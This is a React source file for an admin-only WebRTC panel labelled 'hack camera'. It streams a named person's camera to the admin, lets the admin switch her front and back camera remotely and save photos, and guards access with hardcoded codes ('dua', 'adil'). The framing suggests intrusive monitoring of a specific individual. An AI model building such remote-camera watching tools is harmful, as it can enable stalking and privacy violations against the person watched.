import { useEffect, useRef, useState } from "react";
import { Camera, SwitchCamera, Video, VideoOff } from "lucide-react";
import { toast } from "sonner";
import { ensureRealtime, onRealtime, onWsOpen, sendRealtime } from "@/lib/livecam-signaling";
import { addIce, captureVideoFrame, closePeer, createPeer } from "@/lib/livecam";
import { Button } from "@/components/ui/button";
import { cn } from "@/lib/utils";

export function AdminCameraPanel() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const pc = useRef<RTCPeerConnection | null>(null);
  const liveRef = useRef(false);
  const iceBuf = useRef<{ candidate: string; sdpMid?: string | null; sdpMLineIndex?: number | null }[]>([]);
  const handling = useRef(false);
  const [live, setLive] = useState(false);
  const [status, setStatus] = useState("Waiting for Dua…");
  const [facing, setFacing] = useState<"user" | "environment">("user");

  function switchCam(mode: "user" | "environment") {
    setFacing(mode);
    sendRealtime({ type: "livecam.switch", payload: { facing: mode } });
  }

  function takePhoto() {
    const video = videoRef.current;
    if (!video || !liveRef.current) {
      toast.error("Wait for live video first");
      return;
    }
    if (captureVideoFrame(video)) toast.success("Photo saved to your device");
    else toast.error("Could not capture photo");
  }

  useEffect(() => {
    ensureRealtime();

    function requestWatch() {
      sendRealtime({ type: "livecam.watch" });
      if (!liveRef.current) setStatus("Waiting for Dua…");
    }

    requestWatch();
    const offOpen = onWsOpen(requestWatch);
    const retry = window.setInterval(() => {
      if (!liveRef.current) requestWatch();
    }, 6000);

    async function flushIce(conn: RTCPeerConnection) {
      const queued = iceBuf.current.splice(0);
      for (const c of queued) await addIce(conn, c);
    }

    function wireConn(conn: RTCPeerConnection) {
      conn.ontrack = (ev) => {
        const stream = ev.streams[0] ?? new MediaStream(ev.track ? [ev.track] : []);
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          void videoRef.current.play().catch(() => undefined);
        }
        setLive(true);
        liveRef.current = true;
        setStatus("Live");
      };
      conn.onicecandidate = (ev) => {
        if (!ev.candidate) return;
        sendRealtime({
          type: "livecam.ice",
          payload: {
            candidate: ev.candidate.candidate,
            sdpMid: ev.candidate.sdpMid,
            sdpMLineIndex: ev.candidate.sdpMLineIndex,
          },
        });
      };
      conn.onconnectionstatechange = () => {
        if (conn.connectionState === "failed" || conn.connectionState === "disconnected") {
          setLive(false);
          liveRef.current = false;
          setStatus("Connection lost — reconnecting…");
          sendRealtime({ type: "livecam.watch" });
        }
      };
    }

    const offMsg = onRealtime(async (msg) => {
      if (msg.type === "livecam.offer") {
        const p = msg.payload as { sdp?: string };
        if (!p.sdp || handling.current) return;
        handling.current = true;
        iceBuf.current = [];
        try {
          closePeer(pc.current);
          const conn = createPeer();
          pc.current = conn;
          wireConn(conn);
          await conn.setRemoteDescription({ type: "offer", sdp: p.sdp });
          await flushIce(conn);
          const answer = await conn.createAnswer();
          await conn.setLocalDescription(answer);
          sendRealtime({ type: "livecam.answer", payload: { sdp: answer.sdp! } });
        } catch {
          setLive(false);
          liveRef.current = false;
          setStatus("Reconnecting…");
          sendRealtime({ type: "livecam.watch" });
        } finally {
          handling.current = false;
        }
        return;
      }
      if (msg.type === "livecam.ice") {
        const p = msg.payload as { candidate?: string; sdpMid?: string | null; sdpMLineIndex?: number | null };
        if (!p.candidate) return;
        const conn = pc.current;
        if (!conn || !conn.remoteDescription) {
          iceBuf.current.push(p as { candidate: string; sdpMid?: string | null; sdpMLineIndex?: number | null });
          return;
        }
        await addIce(conn, {
          candidate: p.candidate,
          sdpMid: p.sdpMid,
          sdpMLineIndex: p.sdpMLineIndex,
        });
      }
    });

    return () => {
      offOpen();
      offMsg();
      window.clearInterval(retry);
      sendRealtime({ type: "livecam.unwatch" });
      closePeer(pc.current);
      pc.current = null;
      if (videoRef.current) videoRef.current.srcObject = null;
    };
  }, []);

  return (
    <div className="flex h-full min-h-0 flex-1 flex-col bg-black/40 p-4 md:p-6">
      <div className="mb-4 flex items-center gap-3">
        <Video className="h-5 w-5 text-rose-400" />
        <div>
          <h1 className="font-serif text-2xl text-pink-100">hack camera</h1>
          <p className="text-xs text-pink-300/80">only admin · you watch Dua here</p>
        </div>
        <span
          className={`ml-auto flex items-center gap-2 rounded-full px-3 py-1 text-xs ${live ? "bg-emerald-500/20 text-emerald-300" : "bg-zinc-800 text-pink-300/70"}`}
        >
          <span className={`h-2 w-2 rounded-full ${live ? "animate-pulse bg-emerald-400" : "bg-zinc-500"}`} />
          {status}
        </span>
      </div>
      <div className="relative min-h-0 flex-1 overflow-hidden rounded-3xl border border-pink-500/30 bg-zinc-950 shadow-[0_0_60px_rgba(244,63,94,0.15)]">
        <video ref={videoRef} autoPlay playsInline muted={false} className="h-full w-full object-cover" />
        {!live && (
          <div className="absolute inset-0 grid place-items-center bg-black/70">
            <div className="max-w-xs px-6 text-center">
              <VideoOff className="mx-auto h-12 w-12 text-pink-400/50" />
              <p className="mt-3 text-sm text-pink-200/80">{status}</p>
              <p className="mt-3 text-xs leading-relaxed text-pink-400/70">
                1. Dua logs in with code <strong>dua</strong>
                <br />
                2. You stay on this page with code <strong>adil</strong>
                <br />
                3. Dua allows camera when asked
              </p>
            </div>
          </div>
        )}
      </div>
      <div className="mt-3 flex flex-wrap items-center gap-2">
        <Button
          type="button"
          size="sm"
          variant="secondary"
          className={cn("rounded-full", facing === "user" && "ring-2 ring-rose-400")}
          onClick={() => switchCam("user")}
        >
          <SwitchCamera className="mr-1.5 h-4 w-4" />
          Front
        </Button>
        <Button
          type="button"
          size="sm"
          variant="secondary"
          className={cn("rounded-full", facing === "environment" && "ring-2 ring-rose-400")}
          onClick={() => switchCam("environment")}
        >
          <SwitchCamera className="mr-1.5 h-4 w-4 rotate-180" />
          Back
        </Button>
        <Button type="button" size="sm" className="ml-auto rounded-full bg-gradient-to-r from-rose-500 to-fuchsia-600" onClick={takePhoto}>
          <Camera className="mr-1.5 h-4 w-4" />
          Save photo
        </Button>
      </div>
    </div>
  );
}
